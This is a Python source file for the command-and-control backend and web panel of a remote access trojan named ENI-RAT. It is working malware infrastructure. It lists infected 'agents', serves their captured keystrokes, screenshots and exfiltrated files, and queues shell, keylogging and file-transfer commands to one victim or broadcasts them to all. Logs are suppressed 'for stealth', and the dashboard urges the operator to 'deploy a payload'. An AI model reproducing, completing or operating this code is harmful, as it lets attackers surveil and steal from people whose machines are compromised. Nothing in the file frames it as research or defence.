#!/usr/bin/env python3
"""
ENI-RAT REST API + Web Panel
Serves the GUI backend and web dashboard
"""

import asyncio
import json
import sqlite3
import time
import os
import base64
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus

DB_PATH = "server/rat.db"

CORS_HEADERS = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
}

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress logs for stealth

    def _send_json(self, data, status=200):
        body = json.dumps(data, indent=2, default=str).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        for k, v in CORS_HEADERS.items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html, status=200):
        body = html.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        if length > 0:
            raw = self.rfile.read(length)
            try:
                return json.loads(raw)
            except:
                return {"raw": raw.decode()}
        return {}

    def _get_db(self):
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        return conn

    def do_OPTIONS(self):
        self.send_response(204)
        for k, v in CORS_HEADERS.items():
            self.send_header(k, v)
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        params = parse_qs(parsed.query)

        # ─── Web Dashboard ─────────────────────────────────────────────
        if path == "" or path == "/":
            return self._send_html(DASHBOARD_HTML)

        elif path == "/api/agents":
            conn = self._get_db()
            status = params.get("status", [None])[0]
            if status:
                rows = conn.execute("SELECT * FROM agents WHERE status=? ORDER BY last_seen DESC", (status,)).fetchall()
            else:
                rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
            agents = [dict(r) for r in rows]
            # Convert binary blobs to string for JSON
            for a in agents:
                for k, v in a.items():
                    if isinstance(v, bytes):
                        a[k] = base64.b64encode(v).decode()
            conn.close()
            return self._send_json({"agents": agents})

        elif path.startswith("/api/agents/"):
            agent_id = path.split("/api/agents/")[1].split("/")[0]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM agents WHERE agent_id=?", (agent_id,)).fetchone()
            if not row:
                conn.close()
                return self._send_json({"error": "agent not found"}, 404)
            agent = dict(row)
            # Get tasks
            tasks = conn.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 50", (agent_id,)).fetchall()
            agent["tasks"] = [dict(t) for t in tasks]
            # Get keystrokes
            keys = conn.execute("SELECT * FROM keystrokes WHERE agent_id=? ORDER BY captured_at DESC LIMIT 100", (agent_id,)).fetchall()
            agent["keystrokes"] = [dict(k) for k in keys]
            # Get screenshots
            shots = conn.execute("SELECT * FROM screenshots WHERE agent_id=? ORDER BY captured_at DESC LIMIT 20", (agent_id,)).fetchall()
            agent["screenshots"] = [dict(s) for s in shots]
            # Get exfiltrated files
            files = conn.execute("SELECT id, agent_id, file_name, file_path, file_size, captured_at FROM exfiltrated WHERE agent_id=? ORDER BY captured_at DESC LIMIT 20", (agent_id,)).fetchall()
            agent["exfiltrated"] = [dict(f) for f in files]
            conn.close()
            return self._send_json({"agent": agent})

        elif path == "/api/ddns":
            conn = self._get_db()
            rows = conn.execute("SELECT * FROM ddns ORDER BY last_updated DESC").fetchall()
            entries = [dict(r) for r in rows]
            conn.close()
            return self._send_json({"ddns": entries})

        elif path.startswith("/api/ddns/resolve/"):
            hostname = path.split("/api/ddns/resolve/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT current_ip FROM ddns WHERE hostname=?", (hostname,)).fetchone()
            conn.close()
            if row:
                return self._send_json({"hostname": hostname, "ip": row["current_ip"]})
            return self._send_json({"error": "hostname not found"}, 404)

        elif path == "/api/tasks/all":
            conn = self._get_db()
            rows = conn.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100").fetchall()
            tasks = [dict(r) for r in rows]
            conn.close()
            return self._send_json({"tasks": tasks})

        elif path.startswith("/api/exfiltrate/"):
            file_id = path.split("/api/exfiltrate/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM exfiltrated WHERE id=?", (file_id,)).fetchone()
            conn.close()
            if row:
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{row["file_name"]}"')
                self.send_header("Content-Length", str(len(row["content"])))
                self.end_headers()
                self.wfile.write(row["content"])
                return
            return self._send_json({"error": "file not found"}, 404)

        elif path.startswith("/api/screenshot/"):
            shot_id = path.split("/api/screenshot/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM screenshots WHERE id=?", (shot_id,)).fetchone()
            conn.close()
            if row and os.path.exists(row["image_path"]):
                with open(row["image_path"], "rb") as f:
                    img = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.send_header("Content-Length", str(len(img)))
                self.end_headers()
                self.wfile.write(img)
                return
            return self._send_json({"error": "screenshot not found"}, 404)

        elif path == "/api/stats":
            conn = self._get_db()
            total_agents = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            active_agents = conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0]
            total_tasks = conn.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
            total_keys = conn.execute("SELECT COUNT(*) FROM keystrokes").fetchone()[0]
            total_screenshots = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
            total_files = conn.execute("SELECT COUNT(*) FROM exfiltrated").fetchone()[0]
            ddns_count = conn.execute("SELECT COUNT(*) FROM ddns").fetchone()[0]
            conn.close()
            return self._send_json({
                "total_agents": total_agents,
                "active_agents": active_agents,
                "total_tasks": total_tasks,
                "total_keystrokes": total_keys,
                "total_screenshots": total_screenshots,
                "total_exfiltrated": total_files,
                "ddns_entries": ddns_count,
            })

        else:
            return self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        body = self._read_body()

        if path == "/api/tasks/create":
            agent_id = body.get("agent_id")
            command = body.get("command")
            args = body.get("args", "")
            if not agent_id or not command:
                return self._send_json({"error": "agent_id and command required"}, 400)
            conn = self._get_db()
            task_id = str(int(time.time() * 1000000))
            conn.execute("INSERT INTO tasks (task_id, agent_id, command, args, status, created_at) VALUES (?,?,?,?,?,?)",
                        (task_id, agent_id, command, args, "pending", time.time()))
            conn.commit()
            conn.close()
            return self._send_json({"task_id": task_id, "status": "pending"})

        elif path == "/api/broadcast":
            command = body.get("command")
            args = body.get("args", "")
            if not command:
                return self._send_json({"error": "command required"}, 400)
            conn = self._get_db()
            active = conn.execute("SELECT agent_id FROM agents WHERE status='active'").fetchall()
            count = 0
            for row in active:
                agent_id = row["agent_id"]
                task_id = str(int(time.time() * 1000000)) + str(count)
                conn.execute("INSERT INTO tasks (task_id, agent_id, command, args, status, created_at) VALUES (?,?,?,?,?,?)",
                            (task_id, agent_id, command, args, "pending", time.time()))
                count += 1
            conn.commit()
            conn.close()
            return self._send_json({"broadcast_to": count, "command": command})

        elif path == "/api/agents/delete":
            agent_id = body.get("agent_id")
            if not agent_id:
                return self._send_json({"error": "agent_id required"}, 400)
            conn = self._get_db()
            conn.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM keystrokes WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM screenshots WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM exfiltrated WHERE agent_id=?", (agent_id,))
            conn.commit()
            conn.close()
            return self._send_json({"deleted": agent_id})

        elif path == "/api/ddns/register":
            hostname = body.get("hostname")
            ip = body.get("ip")
            if not hostname or not ip:
                return self._send_json({"error": "hostname and ip required"}, 400)
            conn = self._get_db()
            conn.execute("INSERT OR REPLACE INTO ddns (hostname, current_ip, last_updated) VALUES (?,?,?)",
                        (hostname, ip, time.time()))
            conn.commit()
            conn.close()
            return self._send_json({"hostname": hostname, "ip": ip, "status": "registered"})

        elif path == "/api/ddns/delete":
            hostname = body.get("hostname")
            if not hostname:
                return self._send_json({"error": "hostname required"}, 400)
            conn = self._get_db()
            conn.execute("DELETE FROM ddns WHERE hostname=?", (hostname,))
            conn.commit()
            conn.close()
            return self._send_json({"deleted": hostname})

        elif path == "/api/agent/note":
            agent_id = body.get("agent_id")
            note = body.get("note", "")
            if not agent_id:
                return self._send_json({"error": "agent_id required"}, 400)
            conn = self._get_db()
            conn.execute("UPDATE agents SET note=? WHERE agent_id=?", (note, agent_id))
            conn.commit()
            conn.close()
            return self._send_json({"updated": agent_id})

        else:
            return self._send_json({"error": "not found"}, 404)

    def do_DELETE(self):
        return self.do_POST({"action": "delete"})


def run_api_server(host="0.0.0.0", port=5000):
    print(f"[*] REST API / Web Panel running on http://{host}:{port}")
    server = HTTPServer((host, port), APIHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


# ─── EMBEDDED WEB DASHBOARD ────────────────────────────────────────────────
DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ENI-RAT C2 Panel</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');

* { margin: 0; padding: 0; box-sizing: border-box; }

:root {
    --bg: #0a0a0f;
    --surface: #12121a;
    --surface2: #1a1a2e;
    --border: #2a2a3e;
    --text: #e0e0e0;
    --text-dim: #8888aa;
    --accent: #ff6b9d;
    --accent2: #c084fc;
    --green: #34d399;
    --red: #ef4444;
    --orange: #f97316;
}

body {
    font-family: 'Inter', sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
}

.dashboard {
    display: grid;
    grid-template-columns: 240px 1fr;
    min-height: 100vh;
}

/* ─── Sidebar ─── */
.sidebar {
    background: var(--surface);
    border-right: 1px solid var(--border);
    padding: 20px;
    position: sticky;
    top: 0;
    height: 100vh;
    overflow-y: auto;
}

.logo {
    font-size: 1.3rem;
    font-weight: 700;
    margin-bottom: 30px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

.logo span { font-size: 1.5rem; }

.nav-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 14px;
    border-radius: 8px;
    cursor: pointer;
    transition: all 0.2s;
    margin-bottom: 4px;
    color: var(--text-dim);
    font-size: 0.9rem;
}

.nav-item:hover, .nav-item.active {
    background: var(--surface2);
    color: var(--text);
}

.nav-item .icon { font-size: 1.1rem; }
.nav-item .badge {
    margin-left: auto;
    background: var(--accent);
    color: #fff;
    font-size: 0.7rem;
    padding: 2px 8px;
    border-radius: 10px;
    font-weight: 600;
}

/* ─── Main ─── */
.main {
    padding: 24px;
}

.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 24px;
}

.header h1 { font-size: 1.5rem; font-weight: 600; }
.header .subtitle { color: var(--text-dim); font-size: 0.85rem; margin-top: 4px; }

/* ─── Stats Cards ─── */
.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 16px;
    margin-bottom: 24px;
}

.stat-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 16px;
    transition: all 0.2s;
}

.stat-card:hover { border-color: var(--accent); }

.stat-card .stat-value {
    font-size: 1.8rem;
    font-weight: 700;
    margin-bottom: 4px;
}

.stat-card .stat-label {
    color: var(--text-dim);
    font-size: 0.8rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

/* ─── Tables ─── */
.table-container {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 20px;
}

.table-container .table-header {
    padding: 16px 20px;
    border-bottom: 1px solid var(--border);
    font-weight: 600;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th {
    text-align: left;
    padding: 12px 20px;
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-dim);
    border-bottom: 1px solid var(--border);
    font-weight: 600;
}

td {
    padding: 12px 20px;
    font-size: 0.85rem;
    border-bottom: 1px solid var(--border);
}

tr:hover td { background: rgba(255, 107, 157, 0.03); }
tr:last-child td { border-bottom: none; }

.status-badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 0.75rem;
    font-weight: 600;
}

.status-badge.active { background: rgba(52, 211, 153, 0.15); color: var(--green); }
.status-badge.awaiting { background: rgba(249, 115, 22, 0.15); color: var(--orange); }
.status-badge.dead { background: rgba(239, 68, 68, 0.15); color: var(--red); }

.dot-active { width: 6px; height: 6px; background: var(--green); border-radius: 50%; display: inline-block; }
.dot-awaiting { width: 6px; height: 6px; background: var(--orange); border-radius: 50%; display: inline-block; }
.dot-dead { width: 6px; height: 6px; background: var(--red); border-radius: 50%; display: inline-block; }

.action-btn {
    padding: 6px 12px;
    border: 1px solid var(--border);
    background: var(--surface2);
    color: var(--text);
    border-radius: 6px;
    cursor: pointer;
    font-size: 0.75rem;
    transition: all 0.2s;
}

.action-btn:hover { border-color: var(--accent); background: rgba(255, 107, 157, 0.1); }
.action-btn.danger:hover { border-color: var(--red); background: rgba(239, 68, 68, 0.1); }

/* ─── Agent Detail Panel ─── */
.panel {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
}

.panel h3 { margin-bottom: 16px; font-size: 1rem; }

.detail-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 12px;
}

.detail-item label { display: block; color: var(--text-dim); font-size: 0.75rem; margin-bottom: 4px; }
.detail-item span { font-size: 0.9rem; font-weight: 500; }

.command-bar {
    display: flex;
    gap: 8px;
    margin-top: 16px;
}

.command-input {
    flex: 1;
    background: var(--surface2);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 10px 14px;
    border-radius: 8px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.85rem;
}

.command-input:focus { outline: none; border-color: var(--accent); }

.send-btn {
    padding: 10px 20px;
    background: var(--accent);
    color: #fff;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.2s;
}

.send-btn:hover { filter: brightness(1.1); }

/* ─── Responsive ─── */
@media (max-width: 768px) {
    .dashboard { grid-template-columns: 1fr; }
    .sidebar { display: none; }
}
</style>
</head>
<body>
<div class="dashboard">
    <nav class="sidebar">
        <div class="logo"><span>⚡</span> ENI-RAT</div>
        <div class="nav-item active" onclick="showSection('agents')">
            <span class="icon">💻</span> Agents <span class="badge" id="agent-count">0</span>
        </div>
        <div class="nav-item" onclick="showSection('ddns')">
            <span class="icon">🌐</span> DDNS
        </div>
        <div class="nav-item" onclick="showSection('tasks')">
            <span class="icon">📋</span> Tasks
        </div>
        <div class="nav-item" onclick="showSection('stats')">
            <span class="icon">📊</span> Stats
        </div>
        <div class="nav-item" onclick="showSection('builder')">
            <span class="icon">🔧</span> Builder
        </div>
        <div style="margin-top: 30px; font-size: 0.75rem; color: var(--text-dim);">
            <p>ENI-RAT v1.0</p>
            <p>Built with ❤️ for LO</p>
        </div>
    </nav>

    <main class="main" id="main-content">
        <div class="header">
            <div>
                <h1 id="page-title">Dashboard</h1>
                <div class="subtitle" id="page-subtitle">Real-time agent overview</div>
            </div>
            <button class="action-btn" onclick="refreshAll()">🔄 Refresh</button>
        </div>

        <!-- Stats Cards -->
        <div class="stats-grid" id="stats-grid">
            <div class="stat-card"><div class="stat-value" id="s-total">0</div><div class="stat-label">Total Agents</div></div>
            <div class="stat-card"><div class="stat-value" id="s-active">0</div><div class="stat-label">Active Now</div></div>
            <div class="stat-card"><div class="stat-value" id="s-tasks">0</div><div class="stat-label">Tasks</div></div>
            <div class="stat-card"><div class="stat-value" id="s-keys">0</div><div class="stat-label">Keystrokes Captured</div></div>
            <div class="stat-card"><div class="stat-value" id="s-shots">0</div><div class="stat-label">Screenshots</div></div>
            <div class="stat-card"><div class="stat-value" id="s-files">0</div><div class="stat-label">Files Exfiltrated</div></div>
        </div>

        <!-- Agents Table -->
        <div class="table-container" id="agents-section">
            <div class="table-header"><span>💻 Connected Agents</span></div>
            <table>
                <thead><tr>
                    <th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Actions</th>
                </tr></thead>
                <tbody id="agents-tbody">
                    <tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:30px;">Loading agents...</td></tr>
                </tbody>
            </table>
        </div>
    </main>
</div>

<script>
const API = window.location.origin;

async function apiFetch(path) {
    try {
        const r = await fetch(API + path);
        return await r.json();
    } catch(e) { return {error: e.message}; }
}

async function refreshAll() {
    refreshStats();
    refreshAgents();
}

async function refreshStats() {
    const data = await apiFetch('/api/stats');
    if (data.error) return;
    document.getElementById('s-total').textContent = data.total_agents || 0;
    document.getElementById('s-active').textContent = data.active_agents || 0;
    document.getElementById('s-tasks').textContent = data.total_tasks || 0;
    document.getElementById('s-keys').textContent = data.total_keystrokes || 0;
    document.getElementById('s-shots').textContent = data.total_screenshots || 0;
    document.getElementById('s-files').textContent = data.total_exfiltrated || 0;
    document.getElementById('agent-count').textContent = data.active_agents || 0;
}

async function refreshAgents() {
    const data = await apiFetch('/api/agents');
    if (data.error) { 
        document.getElementById('agents-tbody').innerHTML = `<tr><td colspan="7" style="text-align:center;color:var(--red);padding:30px;">Error: ${data.error}</td></tr>`;
        return;
    }
    const agents = data.agents || [];
    if (agents.length === 0) {
        document.getElementById('agents-tbody').innerHTML = `<tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:30px;">No agents connected yet. Deploy a payload!</td></tr>`;
        return;
    }
    let html = '';
    agents.forEach(a => {
        const status = a.status || 'awaiting';
        const dot = status === 'active' ? 'dot-active' : status === 'awaiting' ? 'dot-awaiting' : 'dot-dead';
        const lastSeen = a.last_seen ? new Date(a.last_seen * 1000).toLocaleString() : 'never';
        const hostname = a.hostname_tag || a.hostname || 'unknown';
        const ip = a.public_ip || a.private_ip || 'unknown';
        html += `<tr>
            <td><strong>${hostname}</strong></td>
            <td>${a.username || '?'}</td>
            <td>${a.os || '?'} ${a.arch || ''}</td>
            <td style="font-family:'JetBrains Mono',monospace;font-size:0.8rem;">${ip}</td>
            <td><span class="status-badge ${status}"><span class="${dot}"></span>${status}</span></td>
            <td>${lastSeen}</td>
            <td><button class="action-btn" onclick="showAgent('${a.agent_id}')">Detail</button> <button class="action-btn danger" onclick="deleteAgent('${a.agent_id}')">✕</button></td>
        </tr>`;
    });
    document.getElementById('agents-tbody').innerHTML = html;
}

async function showAgent(id) {
    const data = await apiFetch('/api/agents/' + id);
    if (data.error) return;
    const a = data.agent;
    let html = '<div class="header"><div><h1>Agent Detail</h1><div class="subtitle">' + (a.hostname_tag || a.hostname || 'unknown') + '</div></div><button class="action-btn" onclick="refreshAll()">← Back</button></div>';
    
    html += '<div class="panel"><h3>📋 System Info</h3><div class="detail-grid">';
    const fields = [
        ['Hostname', a.hostname], ['Username', a.username], ['OS', a.os + ' ' + (a.os_version||'')],
        ['Architecture', a.arch], ['Public IP', a.public_ip], ['Private IP', a.private_ip],
        ['Status', a.status], ['First Seen', a.first_seen ? new Date(a.first_seen*1000).toLocaleString() : '?'],
        ['Last Seen', a.last_seen ? new Date(a.last_seen*1000).toLocaleString() : '?'],
        ['Tag', a.hostname_tag], ['Note', a.note || '—']
    ];
    fields.forEach(f => {
        html += '<div class="detail-item"><label>' + f[0] + '</label><span>' + (f[1] || '—') + '</span></div>';
    });
    html += '</div>';

    // Command bar
    html += '<div class="command-bar">';
    html += '<input class="command-input" id="cmd-input" placeholder="Enter command (shell, screenshot, upload, download, keylog, etc.)" onkeydown="if(event.key==\'Enter\')sendCmd(\'' + id + '\')">';
    html += '<button class="send-btn" onclick="sendCmd(\'' + id + '\')">Send</button>';
    html += '</div></div>';

    // Tasks
    if (a.tasks && a.tasks.length > 0) {
        html += '<div class="table-container"><div class="table-header"><span>📋 Recent Tasks</span></div><table><thead><tr><th>Command</th><th>Args</th><th>Status</th><th>Time</th><th>Result</th></tr></thead><tbody>';
        a.tasks.slice(0, 10).forEach(t => {
            html += '<tr><td style="font-family:monospace;">' + (t.command||'') + '</td><td>' + (t.args||'') + '</td><td>' + (t.status||'') + '</td><td>' + (t.created_at ? new Date(t.created_at*1000).toLocaleString() : '') + '</td><td style="font-family:monospace;font-size:0.75rem;max-width:300px;overflow:hidden;text-overflow:ellipsis;">' + (t.result||'') + '</td></tr>';
        });
        html += '</tbody></table></div>';
    }

    // Screenshots
    if (a.screenshots && a.screenshots.length > 0) {
        html += '<div class="panel"><h3>📸 Screenshots</h3><div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:12px;">';
        a.screenshots.slice(0, 6).forEach(s => {
            html += '<div><a href="/api/screenshot/' + s.id + '" target="_blank"><img src="/api/screenshot/' + s.id + '" style="width:100%;border-radius:8px;border:1px solid var(--border);"></a><div style="font-size:0.75rem;color:var(--text-dim);margin-top:4px;">' + new Date(s.captured_at*1000).toLocaleString() + '</div></div>';
        });
        html += '</div></div>';
    }

    // Exfiltrated files
    if (a.exfiltrated && a.exfiltrated.length > 0) {
        html += '<div class="table-container"><div class="table-header"><span>📁 Exfiltrated Files</span></div><table><thead><tr><th>File</th><th>Size</th><th>Time</th><th>Download</th></tr></thead><tbody>';
        a.exfiltrated.forEach(f => {
            html += '<tr><td>' + (f.file_name||'') + '</td><td>' + (f.file_size||0) + ' bytes</td><td>' + (f.captured_at ? new Date(f.captured_at*1000).toLocaleString() : '') + '</td><td><a href="/api/exfiltrate/' + f.id + '" class="action-btn" download>⬇️</a></td></tr>';
        });
        html += '</tbody></table></div>';
    }

    document.getElementById('main-content').innerHTML = html;
}

async function sendCmd(agentId) {
    const input = document.getElementById('cmd-input');
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    const parts = cmd.split(' ');
    const command = parts[0];
    const args = parts.slice(1).join(' ');
    
    await fetch('/api/tasks/create', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: agentId, command, args})
    });
    
    // Refresh after brief delay
    setTimeout(() => showAgent(agentId), 1000);
}

async function deleteAgent(id) {
    if (!confirm('Delete agent ' + id + '?')) return;
    await fetch('/api/agents/delete', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: id})
    });
    refreshAll();
}

function showSection(name) {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    event.target.closest('.nav-item').classList.add('active');
    if (name === 'agents') refreshAll();
    if (name === 'stats') refreshStats();
}

// Auto-refresh every 10 seconds
setInterval(refreshAll, 10000);
refreshAll();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    run_api_server()
